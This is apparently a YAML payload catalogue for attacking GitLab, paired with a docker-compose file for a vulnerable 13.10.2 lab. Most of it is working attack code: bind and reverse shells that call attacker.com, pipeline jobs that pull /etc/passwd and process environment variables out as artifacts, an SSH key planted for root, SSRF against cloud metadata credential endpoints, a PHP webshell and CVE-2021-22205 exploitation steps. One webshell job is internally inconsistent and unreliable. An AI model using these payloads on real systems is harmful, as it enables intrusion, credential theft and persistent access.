---
comment: |
  GitLab provides code execution vectors through its CI/CD pipeline system (`.gitlab-ci.yml`),
  the Rails console on self-hosted instances, and the admin panel available to GitLab
  administrators. CI/CD pipelines run arbitrary shell commands on registered GitLab Runners,
  which may be shared across projects or self-hosted with broad network access.

  CVE-2021-22205 (CVSS 10.0, CISA KEV): GitLab CE/EE passes user-uploaded images through
  ExifTool for metadata parsing without authentication. A crafted DjVu file exploits a
  command injection in ExifTool's DjVu parser (CVE-2021-22204), achieving unauthenticated
  RCE as the `git` user on the GitLab server.
  Affects GitLab CE/EE 11.9 through 13.10.2 / 13.9.4 / 13.8.6.
docker:
  compose: "services:\n  gitlab:\n    image: gitlab/gitlab-ce:13.10.2-ce.0\n    ports:\n\
    \      - \"8080:80\"\n      - \"2222:22\"\n    environment:\n      GITLAB_OMNIBUS_CONFIG:\
    \ |\n        external_url 'http://localhost:8080'\n        gitlab_rails['gitlab_shell_ssh_port']\
    \ = 2222\n      GITLAB_ROOT_PASSWORD: \"P@ssw0rd!\"\n    shm_size: 256m\n    volumes:\n\
    \      - gitlab_config:/etc/gitlab\n      - gitlab_logs:/var/log/gitlab\n    \
    \  - gitlab_data:/var/opt/gitlab\nvolumes:\n  gitlab_config:\n  gitlab_logs:\n\
    \  gitlab_data:\n"
  note: "Starts GitLab CE 13.10.2 (vulnerable to CVE-2021-22205 unauthenticated RCE\
    \ via ExifTool).\nAccess at `http://localhost:8080`. Initial root password is\
    \ printed in the logs:\n`docker compose logs gitlab | grep \"Password:\"` \u2014\
    \ or set via `GITLAB_ROOT_PASSWORD` env var.\nFirst startup takes 3\u20135 minutes.\
    \ Wait until `docker compose ps` shows the container as healthy.\nThe Rails console\
    \ is accessible with: `docker compose exec gitlab gitlab-rails console`\n"
functions:
  bind-shell:
  - code: |
      stages:
        - bind

      bind_shell:
        stage: bind
        script:
          - nc -lvp 12345 -e /bin/sh
    comment: "Opens a bind shell on TCP port 12345 via a CI/CD pipeline step on the\
      \ Runner machine.\nRequires `nc` with the `-e` flag (standard on Debian/Ubuntu\
      \ runners).\nThe pipeline job hangs while the shell is active \u2014 connect\
      \ from the attacker with:\n  nc victim.com 12345\nInbound firewall rules on\
      \ the Runner may block the port.\n"
    connector: tcp-client
    contexts:
      authenticated:
      ci_cd:
    tty: false
  - code: |
      require 'socket'
      server = TCPServer.new("0.0.0.0", 12345)
      client = server.accept
      exec "/bin/sh", in: client, out: client, err: client
    comment: |
      Bind shell via the GitLab Rails console on the application server itself (not a Runner).
      The console process blocks waiting for a connection on port 12345. Once connected,
      `/bin/sh` replaces the Ruby process with the client socket as stdin/stdout/stderr.
      Connect from the attacker with: nc victim.com 12345
    connector: tcp-client
    contexts:
      admin:
      console:
    tty: false
  file-read:
  - code: |
      puts File.read("/etc/passwd")
    comment: |
      Read a file from the GitLab application server via the Rails console. Useful for
      extracting `gitlab.rb`, database credentials, or secret key files.
    contexts:
      admin:
      console:
  - code: |
      stages:
        - exfil

      read_file:
        stage: exfil
        script:
          - cp /etc/passwd passwd.txt
          - cp /proc/1/environ environ.txt || true
        artifacts:
          paths:
            - passwd.txt
            - environ.txt
          when: always
    comment: "Exfiltrate files from the Runner's filesystem via a CI/CD pipeline step.\
      \ Files must\nbe copied into the project workspace first \u2014 artifact paths\
      \ are relative to the\nproject directory and absolute paths are silently ignored\
      \ by GitLab CI.\nDownload from: CI/CD > Pipelines > <job> > Artifacts.\n"
    contexts:
      authenticated:
      ci_cd:
  file-write:
  - code: |
      # Add an attacker SSH public key for root access
      File.write("/root/.ssh/authorized_keys", "ssh-ed25519 AAAA...attacker_pubkey... attacker\n")

      # Or overwrite the GitLab initial root password file to reset the admin password
      File.write("/etc/gitlab/initial_root_password", "Password: NewP@ssw0rd!\n")
    comment: "Write arbitrary files from the GitLab Rails console on the application\
      \ server.\nThe Rails console is accessible via `gitlab-rails console` on self-hosted\
      \ installs\nor `docker exec -it gitlab gitlab-rails console` in containerized\
      \ deployments.\n\nGitLab uses Puma (Ruby) and does not execute PHP \u2014 write\
      \ OS-level files instead:\n- SSH authorized_keys: grants direct server access\
      \ without a password\n- /etc/gitlab/initial_root_password: resets the GitLab\
      \ admin password on next reconfigure\n- /etc/sudoers.d/git: escalates the git\
      \ process user to root (if sudo is installed)\n- /var/opt/gitlab/gitlab-rails/public/<file>:\
      \ places static files in the web root\n  (served as-is; use for HTML/JS payloads,\
      \ not PHP execution)\n"
    contexts:
      admin:
      console:
  rce:
  - code: |
      # Use the Metasploit module for automated payload generation and delivery:
      #   use exploit/multi/http/gitlab_exiftool_file_read_rce
      #   set RHOSTS victim.com
      #   set LHOST attacker.com
      #   set LPORT 12345
      #   run

      # Manual: upload a crafted DjVu file to any GitLab image upload endpoint
      curl -s -X POST "http://victim.com/users/sign_in" \
        -F "file=@exploit.jpg;type=image/jpeg"
    comment: "\u26A0\uFE0F CISA KEV \u2014 confirmed exploited in the wild.\nCVE-2021-22205:\
      \ GitLab's file upload endpoint passes uploaded images to ExifTool\nwithout\
      \ authentication. ExifTool's DjVu parser is vulnerable to argument injection\n\
      (CVE-2021-22204), allowing OS command execution embedded in the file metadata.\n\
      \nThe crafted DjVu file disguised as a JPEG is processed by ExifTool on upload,\n\
      executing the embedded payload as the `git` user on the GitLab application server.\n\
      Use github.com/inspiringgroup/CVE-2021-22205 to generate the malicious file.\n\
      \nRef: https://www.exploit-db.com/exploits/49968\nnuclei: CVE-2021-22205\n"
    contexts:
      unauthenticated:
    version: |-
      11.9 - 13.10.2 / 13.9.4 / 13.8.6
  - code: |
      stages:
        - exec

      run:
        stage: exec
        script:
          - id
          - env
    comment: |
      A `.gitlab-ci.yml` pipeline executes arbitrary shell commands on a GitLab Runner.
      Push this file to any branch of a project with CI/CD enabled, or create a pipeline
      via the UI under CI/CD > Pipelines > Run Pipeline. The Runner's OS user and environment
      variables (including masked CI/CD variables) are accessible.
    contexts:
      authenticated:
      ci_cd:
  - code: |
      `id`
    comment: |
      The GitLab Rails console provides direct access to the Ruby on Rails application runtime
      on self-hosted instances. Accessible via `gitlab-rails console` on the server, or through
      `docker exec` in containerized deployments. Executes OS commands as the `git` user.
    contexts:
      admin:
      console:
  reverse-shell:
  - blind: true
    code: |
      stages:
        - shell

      reverse_shell:
        stage: shell
        script:
          - bash -i >& /dev/tcp/attacker.com/12345 0>&1
    comment: "Execute a reverse shell as a CI/CD pipeline step. The shell runs as\
      \ the GitLab Runner's\nOS user on the Runner machine, not the GitLab server.\
      \ Push to any CI/CD-enabled branch.\nOutput goes to the attacker's listener\
      \ \u2014 the GitLab job log shows the step as running\nuntil the connection\
      \ is dropped.\n"
    contexts:
      authenticated:
      ci_cd:
    listener: tcp-server
    tty: false
  - blind: true
    code: |
      require 'socket'
      f = TCPSocket.open("attacker.com", 12345).to_i
      exec sprintf("/bin/sh -i <&%d >&%d 2>&%d", f, f, f)
    comment: "Reverse shell from the GitLab Rails console, executing in the context\
      \ of the `git` user\non the GitLab application server. Requires server-level\
      \ access to the Rails console.\nThe TCP socket carries all I/O \u2014 the Rails\
      \ console session ends once exec() replaces\nthe current process.\n"
    contexts:
      admin:
      console:
    listener: tcp-server
    tty: false
  ssrf:
  - code: |
      # Create a project with an import URL pointing to an internal endpoint (authenticated)
      curl -s -X POST "http://victim.com/api/v4/projects" \
        -H "PRIVATE-TOKEN: <api_token>" \
        -H "Content-Type: application/json" \
        -d '{
          "name": "probe",
          "path": "probe",
          "import_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        }'

      # Register a webhook pointing to an internal endpoint, then push to trigger it:
      curl -s -X POST "http://victim.com/api/v4/projects/<project_id>/hooks" \
        -H "PRIVATE-TOKEN: <api_token>" \
        -H "Content-Type: application/json" \
        -d '{"url": "http://169.254.169.254/latest/meta-data/", "push_events": true}'
    comment: "GitLab's project import feature fetches an external Git repository URL\
      \ server-side.\nSupplying an internal URL causes the GitLab server to make an\
      \ outbound HTTP GET to\nthe target \u2014 import errors or logs may reflect\
      \ the response body or status code.\n\nThe webhook vector triggers an HTTP POST\
      \ from the GitLab server to any configured URL\non push, merge request, or pipeline\
      \ events. GitLab logs the response status code.\n\nNote: since GitLab 10.6,\
      \ outbound requests to local/private networks from webhooks\nrequire admin to\
      \ enable \"Allow requests to the local network from web hooks and services\"\
      \nat Admin > Settings > Network. The import_url path is less restricted by default.\n\
      \nTarget cloud metadata endpoints:\n- AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\
      - GCP: http://metadata.google.internal/computeMetadata/v1/\n- Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01\n"
    contexts:
      api_token:
      authenticated:
  webshell:
  - code: |
      stages:
        - drop

      drop_shell:
        stage: drop
        script:
          - echo '<?php if(isset($_REQUEST["c"])){system($_REQUEST["c"]);} ?>' > /var/www/html/shell.php
        artifacts:
          paths:
            - shell.php
          when: always
    comment: |
      Writes a PHP webshell to the Runner's filesystem via a CI/CD pipeline step, then
      uploads it as a build artifact downloadable from the GitLab UI.
      Navigate to: CI/CD > Pipelines > <job> > Artifacts > Download to retrieve the file.
      For deployment: if the Runner has write access to a shared web root (common when
      the Runner and web server share a host), set the path to the actual webroot directly.
    contexts:
      authenticated:
      ci_cd:
...
